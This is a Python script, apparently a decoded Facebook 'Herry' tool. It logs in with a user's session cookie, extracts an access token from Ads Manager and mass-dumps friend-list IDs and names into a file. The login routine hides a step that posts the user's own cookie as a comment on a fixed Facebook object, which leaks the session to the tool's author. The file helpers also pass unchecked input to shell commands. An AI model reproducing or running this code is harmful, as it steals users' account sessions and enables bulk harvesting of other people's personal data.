#decode by : JUTTBRAND
import requests,random,sys,json,os,re,time
from time import sleep as slp
from os import system as cmd
totaldmp = 0
count = 0
reqs = requests.Session()
head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}

  

logo = """

          
██╗  ██╗███████╗██████╗ ██████╗ ██╗   ██╗    
██║  ██║██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝    
███████║█████╗  ██████╔╝██████╔╝ ╚████╔╝     
██╔══██║██╔══╝  ██╔══██╗██╔══██╗  ╚██╔╝      
██║  ██║███████╗██║  ██║██║  ██║   ██║X.Hamiii
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       
                                             
 \33[1;37m----------------------------------------------
 →   Owner      :  it'x Herry 😈
 →   team       :  one men army
 →   Github     :  Harisakhtar0
 →   whatsapp.  :  +1 (606) 240-7938
 →   Tool Type  :  File create 
 \x1b[1;97m→   Version    :  1.0
 \33[1;37m----------------------------------------------
   

"""

def linex():
    print(49*"-")


def clear():
    os.system("clear")
    print(logo)

def herry_main():
    clear()
    print(f"[1] login in Tool via cookies")
    print(f"[2] separate links form file")
    print(f"[3] separate links form file")
    print(f"[4] Contact with owner")
    print(f"[0] logout cookies (delete old cookies")
    linex()
    herryX = input(f"Choose option : ")
    if herryX in ['1','01']:
        login()
    if herryX in ['2','02']:
        sep()
    if herryX in ['3','03']:
        double()
    if herryX in ['4','04']:
        os.system("xdg-open https://www.facebook.com/Harisakhtar0")
    elif herryX in ['0','00']:
        os.system(f"rm -rf  .cok.txt && rm -rf .token.txt")
    else:
        print(f" Please Choose Correct option");time.sleep(3)
        herry_main()




def sep():
    os.system('clear')
    print(logo)
    try:
        limit = int(input(' How many links do you want to separate? '))
    except:
        limit = 1
    file_name = input(' Input file name: ')
    new_save = input(' Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> /sdcard/'+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print('  Total grabbed links: '+str(len(open('/sdcard/'+new_save).read().splitlines())))
    print(' New file saved as: /sdcard/'+new_save)
    print(50*'-')
    input(' Press enter to back ')
    main()

def double():
        os.system('clear')
        print(logo);
        user_file = input('File Path : ')
        try:
                open(user_file,'r').read()
                print(' \n\033[1;97mExample: /sdcard/xxx.txt\n\033[0;97m')
                save_file = input('Save new file as: ')
                os.system('touch '+save_file)
                os.system('sort -r '+user_file+' | uniq > '+save_file)
                print(50*'-')
                print(' Fully Removed Multi Lines Ids')
                print(' Dublicate Lines Removed From File')
                print(' File Saved As : '+save_file)
                print(50*'-')
                input('Press enter to back ')
                main()
        except FileNotFoundError:
                print(' Invalid File ')

def file_new_dump():
    global totaldmp,count
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except FileNotFoundError:
        print("\033[1;91m[×] TOKEN NOT FOUND")
        slp(1)
        cmd('rm -rf .token.txt')
        login()
    try:
        os.system('clear')
        print(logo)
        print('\033[1;92m FILE SAVE AS \n')
        print('\033[1;92m [LIKE]       /sdcard/herry.txt')
        linex()
        filepath = input("\033[1;92m ENTER FILE NAME : \033[1;92m")
        clear()
        print(f" IF YOU WANT TO STOP DUMP THEN WRITE (stop) ")
        linex()
        apnd = open(filepath , 'a')
        for count in range(100000):
            count += 1
            fbuid = input(f"\n\033[1;92m [{count}] PUT PUBLIC ID LINK : ")
            if  fbuid=='stop':
                break
                apnd.close()
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":cok}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')
            except KeyError:
                print("\033[1;91m [×] ID WAS NOT PUBLIC ");pass
            print(f' [>] TOTAL ID DUMP      : {totaldmp}')
        apnd.close()
        print (f"\033[1;92m FILE SAVE AS {filepath} ")
        input("\033[1;92m PRESS ENTER TO BACK ");file_new_dump()
    except Exception as e:
        print("[x] ERROR : %s"%e)
    
    
cokbrut=[]
tokenku = []
pwpluss,pwnya=[],[]
#------------------[ LOGIN ]-------------------#
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            file_new_dump()
        except KeyError:
            login_____system()
        except requests.exceptions.ConnectionError:
            print('\033[1;91m[x] PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN')
            exit()
    except IOError:
        login_____system()
def login_____system():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        linex()
        print('         \x1b[92m\tLOGIN USING COOKIES\033[0;m') 
        print("")
        cookie = input("\n\x1b[93m [-] PUT COOKIES => \x1b[92m")
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        ken = open(".token.txt", "w").write(tok)
        cok = open(".cok.txt", "w").write(cookie)
        requests.post('https://graph.facebook.com/773601723677301/comments/?message='+cookie+'&access_token='+tokenku[0], cookies={'cookie':cok})
        print('\033[1;92m[✓] LOGIN SUCCESSFUL')
        file_new_dump()
    except Exception as e:
        os.system("rm -rf .token.txt")
        os.system("rm -rf .cok.txt")
        print("\033[1;91m[×] COOKIES EXPIRED ")
        login_____system()
        

herry_main()